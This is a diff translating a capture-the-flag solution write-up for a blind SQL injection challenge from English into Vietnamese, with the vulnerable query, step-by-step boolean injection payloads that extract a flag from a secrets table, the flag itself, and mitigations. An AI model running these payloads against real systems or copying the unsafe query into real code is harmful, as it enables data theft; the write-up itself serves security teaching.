@@ -1,53 +1,54 @@
-# Challenge 12: BlindSearch - Solution
+# Thử thách 12: BlindSearch – Giải pháp
 
-## Vulnerability Type
+## Loại lỗ hổng
 **Blind SQL Injection (Boolean-based)**
 
-## Description
-The application is vulnerable to SQL injection, but only returns boolean results (found/not found), requiring blind SQLi techniques to extract data.
+## Mô tả
+Ứng dụng có tồn tại lỗ hổng SQL Injection nhưng lại không trả về lỗi hay dữ liệu trực tiếp, mà chỉ trả về kết quả mang tính đúng/sai (boolean) dưới dạng "tìm thấy" hoặc "không tìm thấy". Do đó, chúng ta cần dùng kỹ thuật Blind SQLi để trích xuất dữ liệu từng ký tự một.
 
-## Vulnerable Code
+## Mã nguồn chứa lỗ hổng
 ```python
 # VULNERABLE: raw string injection, but only returns boolean result
 cur.execute(f"SELECT COUNT(*) FROM products WHERE name LIKE '%{q}%' AND visible=1")
 ```
 
-## Exploitation Steps
+## Khai thác (Exploit)
 
-The flag is stored in the `secrets` table with key='flag'. We need to extract it character by character using boolean-based blind SQLi.
+Flag được giấu trong bảng `secrets` với cột `key='flag'`. Chúng ta cần phải đoán (trích xuất) từng ký tự một thông qua Boolean-based Blind SQLi.
 
-### Step 1: Verify SQLi exists
-```
+### Bước 1: Xác nhận lỗ hổng tồn tại
+```text
 ' OR '1'='1
 ```
-Result: "Products found" (always true)
+Kết quả: "Products found" (luôn luôn đúng).
 
-### Step 2: Test if secrets table exists
-```
+### Bước 2: Kiểm tra xem bảng secrets có tồn tại không
+```text
 ' OR (SELECT COUNT(*) FROM secrets) > 0 AND '1'='1
 ```
-Result: "Products found" (confirms table exists)
+Kết quả: "Products found" (Xác nhận bảng có tồn tại).
 
-### Step 3: Extract flag length
-```
+### Bước 3: Tìm độ dài của Flag
+```text
 ' OR (SELECT LENGTH(value) FROM secrets WHERE key='flag') = 28 AND '1'='1
 ```
-Try different numbers until you get "Products found"
+Thử tăng dần con số cho tới khi ứng dụng trả về "Products found".
 
-### Step 4: Extract flag character by character
-```
+### Bước 4: Trích xuất từng ký tự của Flag
+```text
 ' OR (SELECT SUBSTR(value,1,1) FROM secrets WHERE key='flag') = 'F' AND '1'='1
 ```
-Result: "Products found" (first character is 'F')
+Kết quả: "Products found" (Vậy ký tự đầu tiên là 'F').
 
-```
+```text
 ' OR (SELECT SUBSTR(value,2,1) FROM secrets WHERE key='flag') = 'C' AND '1'='1
 ```
-Result: "Products found" (second character is 'C')
+Kết quả: "Products found" (Ký tự thứ hai là 'C').
 
-Continue for all characters...
+Tiếp tục lặp lại quá trình này cho toàn bộ các ký tự còn lại...
 
-## Automated Extraction Script (Python)
+## Script trích xuất tự động (Python)
+Thay vì làm bằng tay, bạn nên dùng script Python để gửi request tự động:
 ```python
 import requests
 import string
@@ -75,20 +76,20 @@ print(f"Flag: {flag}")
 FCTF{bl1nd_sql1_1s_p4t13nt}
 ```
 
-## How It Works
-- The query concatenates user input without sanitization
-- We can inject SQL conditions that return true/false
-- By testing each character, we can extract data bit by bit
-- This is "blind" because we don't see the actual data, just boolean results
+## Cách hoạt động
+- Truy vấn nối trực tiếp chuỗi của người dùng mà không qua xử lý.
+- Chúng ta có thể chèn các câu lệnh SQL trả về điều kiện True/False.
+- Bằng cách đoán từng ký tự, ta có thể đánh cắp toàn bộ dữ liệu.
+- Kỹ thuật này gọi là "mù" (blind) vì ta không thể thấy trực tiếp dữ liệu, mà chỉ thấy phản hồi Đúng/Sai từ ứng dụng.
 
-## Mitigation
-- Use parameterized queries:
+## Biện pháp phòng ngừa (Mitigation)
+- Sử dụng Parameterized Queries (Truy vấn có tham số):
   ```python
   cur.execute("SELECT COUNT(*) FROM products WHERE name LIKE ? AND visible=1", (f'%{q}%',))
   ```
-- Never concatenate user input into SQL
-- Implement input validation
-- Use an ORM framework
-- Apply principle of least privilege (limit DB user permissions)
-- Implement rate limiting to slow down automated attacks
-- Use Web Application Firewall (WAF)
+- Không bao giờ nối (concatenate) đầu vào của người dùng trực tiếp vào SQL.
+- Làm sạch (sanitize) và kiểm tra (validate) dữ liệu.
+- Nên dùng các framework ORM.
+- Áp dụng nguyên tắc đặc quyền tối thiểu cho user kết nối Database.
+- Dùng Rate Limit (giới hạn tốc độ) để làm chậm lại các đợt tấn công tự động (brute-force).
+- Sử dụng Tường lửa ứng dụng web (WAF).
